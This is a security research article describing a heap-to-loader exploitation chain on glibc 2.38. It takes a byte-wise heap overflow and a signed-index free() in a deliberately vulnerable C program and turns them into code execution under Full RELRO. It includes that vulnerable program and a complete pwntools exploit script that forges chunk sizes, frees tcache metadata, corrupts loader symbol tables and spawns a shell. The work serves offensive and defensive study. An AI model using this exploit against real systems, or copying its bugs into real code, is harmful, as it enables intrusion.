![undefined](https://lowlevel.re/uploads/1769708079156.png)

## Abstract

Modern heap hardening mechanisms — including **tcache**, allocator-level **size restrictions**, and **Full RELRO** — are commonly assumed to drastically reduce the exploitability of heap-based vulnerabilities, particularly in the absence of memory disclosure primitives.

This paper demonstrates that this assumption is **fundamentally incomplete**.

We present a fully detailed, end-to-end exploitation chain that derives a **precise, byte-wise relative write primitive** from a constrained heap vulnerability, bypasses allocator-enforced size limits, **corrupts tcache metadata itself**, and escalates into **dynamic loader metadata corruption**, resulting in **arbitrary code execution under Full RELRO**, **without GOT**, **without PLT**, and **without absolute address disclosure**.

Rather than relying on a single powerful bug, this work focuses on the **composition of weak primitives across subsystems**: heap metadata corruption, tcache trust violations, pointer confusion, and dynamic loader metadata abuse. The result is not a fragile exploit, but a **general exploitation methodology** applicable to modern post-mitigation environments.

---

## Scope & Assumptions

This exploitation chain is demonstrated against a specific glibc allocator and dynamic loader configuration. Certain properties — such as relative DSO layout and the presence of writable loader mappings — are **empirical rather than ABI-guaranteed**.

The objective is not universal exploit reliability across all systems, but to demonstrate that **modern hardening does not eliminate cross-subsystem composition attacks** when implicit trust boundaries remain intact.

---

## 1. Threat Model

The attacker has:

* A **heap-based out-of-bounds write**

    * byte-granular
    * forward-only
    * relative to a valid allocation
* A **signed index confusion** allowing unintended `free()` targets
* **No arbitrary memory read**
* **No absolute address disclosure**
* All standard modern mitigations enabled (ASLR, NX, PIE, Full RELRO)

The attacker cannot:

* leak libc or heap base addresses directly
* overwrite function pointers directly
* invoke PLT- or GOT-based resolution paths

This threat model reflects realistic post-mitigation exploitation scenarios and explicitly forbids classic shortcuts commonly relied upon in historical heap exploits.

### Environment

* glibc 2.38 (Ubuntu 24.04)
* ld-linux-x86-64.so.2 2.38
* GCC 13.2.0
* Linux 6.8.0 (x86_64)
* Full RELRO, PIE, NX, ASLR enabled

---

## 2. High-Level Invariant

> **Invariant — Cross-Subsystem Trust Invariant**
> If attacker-controlled data is interpreted as trusted allocator or loader metadata, control-flow integrity is lost.

This invariant recurs across subsystems that are typically analyzed in isolation:

* Heap chunk metadata (`size` field semantics)
* Tcache freelist management and saturation logic
* Dynamic loader metadata (`DT_SYMTAB`, `Elf64_Sym` resolution)

This exploit demonstrates that **violating allocator invariants enables violating loader invariants**, even though these components belong to distinct layers of the runtime.

---

## 3. Exploitation Overview

```
heap OOB write
   ↓
forged chunk sizes
   ↓
tcache saturation
   ↓
unsorted bin transition
   ↓
arena overlap
   ↓
libc-relative write
   ↓
loader metadata corruption
   ↓
ELF symbol forgery
   ↓
RIP control
```

Each step preserves allocator and loader *structural validity* while progressively expanding attacker influence across trust boundaries.

---

## 4. Vulnerable Program

The following program intentionally models two weak but realistic bugs: a forward-only byte-wise heap overflow and a signed index confusion during `free()`.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define MAX 8
#define MAX_SZ 0x90

void *heapbase;
char *table[MAX];

void getheap(void){
    void *a = malloc(0x500);
    free(a);
    heapbase = (void *)((char *)a - 0x290);
}

void create(void) {
    int idx, size;
    scanf("%d", &idx);
    scanf("%d", &size);

    if (idx >= MAX || size <= 0 || size > MAX_SZ)
        return;

    getchar();

    table[idx] = malloc(size);
    fgets(table[idx], size, stdin);
}

void edit(void) {
    int idx;
    int off;
    unsigned char val;

    scanf("%d", &idx);
    if (idx >= MAX) return;

    scanf("%d", &off);
    scanf("%hhx", &val);
    table[idx][off] = val;
}

void destroy(void) {
    int idx;

    scanf("%d", &idx);
    if (idx >= MAX)
        return;

    free(table[idx]);
    table[idx] = NULL;
}

int main(void) {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    getheap();

    while (1) {
        int c;
        scanf("%d", &c);

        if (c == 1) create();
        if (c == 2) edit();
        if (c == 3) destroy();
        if (c == 4) _exit(0);
    }
}
```

---

## 5. Primitive #1 — Byte-wise Forward Heap Write

The `edit()` function permits a single-byte write at an attacker-controlled positive offset from a valid heap allocation.

Properties:

* byte-level precision
* relative addressing
* forward-only reach
* no direct control-flow overwrite

In isolation, this primitive is insufficient to hijack execution. Its power emerges only through **systematic invariant violation**.

---

## 6. Forging Heap Chunk Sizes

Eight chunks of size `0x30` are allocated contiguously. Using the forward OOB primitive, adjacent chunk size fields are modified.

Encoding a size value of `0x291` yields:

* a usable chunk size of `0x290`
* correct alignment
* `prev_inuse = 1`

glibc does **not validate the provenance** of size fields during `free()`, only their internal consistency.

![fake-sizes](https://lowlevel.re/uploads/1769764729102.png)

---

## 7. Tcache Saturation and Semantic Pivot

Seven forged frees saturate `tcache[0x290]`. Once saturated:

* further frees bypass tcache
* the allocator transitions to unsorted bin handling
* allocation-time size restrictions are no longer relevant

This represents a **semantic pivot**: allocator behavior changes without violating allocator invariants.

![tcache-full](https://lowlevel.re/uploads/1769764980711.png)

---

## 8. Primitive #2 — Signed Index Confusion

The `destroy()` function checks `idx >= MAX` but does not reject negative values. The `table` array is located in the BSS section, and at negative offsets lies the `heapbase` pointer — initialized during `getheap()` to point to the base of the heap arena.

When `destroy(-4)` is called, the program computes `table[-4]`, which reads the `heapbase` pointer and passes it to `free()`. This effectively frees the **tcache\_perthread\_struct** located at the beginning of the heap, since glibc places this metadata structure at the base of the initial heap mapping.

glibc accepts this pointer as a valid chunk address without validating its provenance, modeling a common class of real-world sign and bounds bugs.

---

## 9. Freeing Tcache Metadata Itself

With tcache saturated (7 entries in tcache\[0x290\]), the `free()` of `heapbase` causes **tcache\_perthread\_struct itself** to be interpreted as an unsorted bin chunk.

> Allocator bookkeeping data becomes attacker-controlled heap data.

![unsorted-tcache](https://lowlevel.re/uploads/1769764737682.png)

---

## 10. Deriving a libc-Relative Write Primitive

Subsequent allocations return memory backed by libc arena structures. Combined with the original byte-wise OOB write, this yields a **precise, byte-granular, forward relative write primitive anchored in libc memory**.

![libc-in-heap](https://lowlevel.re/uploads/1769764735179.png)

At this stage, the attacker gains influence over libc state without any address disclosure.

---

## 11. Transition to Loader Metadata

From the libc anchor, writable loader mappings are reachable via relative offsets. Targeted structures include:

* `DT_SYMTAB` pointers inside `struct link_map`
* concrete `Elf64_Sym` entries of already-loaded DSOs

This transition exploits **runtime loader resolution semantics**, described in detail in the companion work *ret2dso*.

---

## 12. ELF Symbol Forgery

During runtime resolution, the loader computes:

```
resolved = sym->st_value + l_addr
```

Only `st_value` influences control flow. All other fields may be reused from an existing legitimate symbol entry, preserving structural consistency.

---

## 13. Runtime Resolution Trigger

A single-byte corruption inside the `stdin` `FILE` structure redirects execution into a libc path that performs runtime symbol resolution.

Because loader metadata has already been corrupted, this resolution yields **direct control of RIP under Full RELRO**.

---

## 14. Address Discovery Strategy

Relative drift between libc and `ld.so` is **empirical rather than guaranteed**, but sufficiently constrained in practice to permit retry-based exploitation.

Importantly, this technique relies on **reachability rather than predictability**: no fixed offsets or brute force of address space are required.

---

## 15. Full Exploit

The following exploit implements the complete chain described above. It is intentionally verbose and structured to mirror the conceptual phases, making the correspondence between theory and practice explicit.

```python
from pwn import *

context.binary = elf = ELF("heap-to-loader")
context.log_level = "info"

found = False
attempt = 1

while not found:
    try:
        log.info(f"Attempt: {attempt}")
        io = process("heap-to-loader")

        # -------------------------------------------------
        # Heap interaction primitives
        # -------------------------------------------------
        def heap_alloc(slot, size, data=b"A"):
            io.sendline(b"1")
            io.sendline(str(slot).encode())
            io.sendline(str(size).encode())
            io.sendline(data)

        def heap_byte_write(slot, offset, byte_hex):
            io.sendline(b"2")
            io.sendline(str(slot).encode())
            io.sendline(str(offset).encode())
            io.sendline(byte_hex)

        def heap_free(slot):
            io.sendline(b"3")
            io.sendline(str(slot).encode())

        # -------------------------------------------------
        # Derived libc-relative write primitive
        # -------------------------------------------------
        def libc_relative_write(anchor_slot, relative_offset, payload: bytes):
            for i, b in enumerate(payload):
                heap_byte_write(anchor_slot, relative_offset + i, f"{b:02x}".encode())

        # -------------------------------------------------
        # Phase 1 — Heap grooming and chunk size forgery
        # -------------------------------------------------
        for i in range(8):
            heap_alloc(i, 0x30)

        # Forge adjacent chunk size fields to 0x291
        for i in range(7):
            heap_byte_write(0, (i * 0x40) + 0x38, b"91")
            heap_byte_write(0, (i * 0x40) + 0x39, b"02")

        # -------------------------------------------------
        # Phase 2 — Tcache saturation
        # -------------------------------------------------
        for i in range(8):
            heap_free(i)

        # -------------------------------------------------
        # Phase 3 — Free heap base
        # -------------------------------------------------
        heap_free(-4)

        # Force unsorted bin allocation
        heap_alloc(0, 0x80, p16(1) * 4)

        # Allocation backed by libc arena structures
        heap_alloc(1, 0x30)

        # -------------------------------------------------
        # Phase 4 — Transition to loader metadata (ret2dso)
        # -------------------------------------------------
        ARENA_TO_STDIN_OFFSET     = -0x240
        STDIN_VTABLE_OFFSET       = 0xd8
        LINKMAP_SYMTAB_OFFSET     = 0xb60
        DSO_SYMBOL_OFFSET         = 0x208
        LD_WRITABLE_BASE_OFFSET   = 0x3a000

        ONE_GADGET_OFFSET         = 0x12ee1a
        LD_LIBC_DRIFT             = 0x1a8560

        forged_st_value = (
            -(LD_LIBC_DRIFT + ONE_GADGET_OFFSET)
            & 0xffffffffffffffff
        )

        forged_symbol = (
            p64(0x19) +                     # st_name (copied)
            p64(0xd001200000020) +          # metadata fields
            p64(forged_st_value)            # forged st_value
        )

        # Redirect DT_SYMTAB inside loader metadata
        target = (
            ARENA_TO_STDIN_OFFSET
            + LD_LIBC_DRIFT
            + LD_WRITABLE_BASE_OFFSET
            + LINKMAP_SYMTAB_OFFSET
        )
        libc_relative_write(1, target, b"\xf0")

        # Overwrite a concrete Elf64_Sym entry
        target = (
            ARENA_TO_STDIN_OFFSET
            + LD_LIBC_DRIFT
            + LD_WRITABLE_BASE_OFFSET
            + DSO_SYMBOL_OFFSET
        )
        libc_relative_write(1, target, forged_symbol)

        # -------------------------------------------------
        # Phase 5 — Trigger runtime resolution via FILE corruption
        # -------------------------------------------------
        target = ARENA_TO_STDIN_OFFSET + STDIN_VTABLE_OFFSET + 7
        libc_relative_write(1, target, b"\xff")

        io.sendline(b"id")
        if b"uid" in io.clean():
            found = True
            io.interactive()

    except Exception:
        io.close()
        attempt += 1

```

---

## 16. Conclusion

Modern mitigations increasingly harden individual subsystems in isolation. This work demonstrates that exploitation remains viable where **implicit trust assumptions cross subsystem boundaries**.

As long as allocator, libc, and loader metadata remain mutually trusted, **weak primitives can be systematically composed into full control-flow compromise**, even under Full RELRO and without memory disclosure.

Source code & environment setup: https://github.com/retleave/pocs

---

*This document is intended for defensive research and educational purposes.*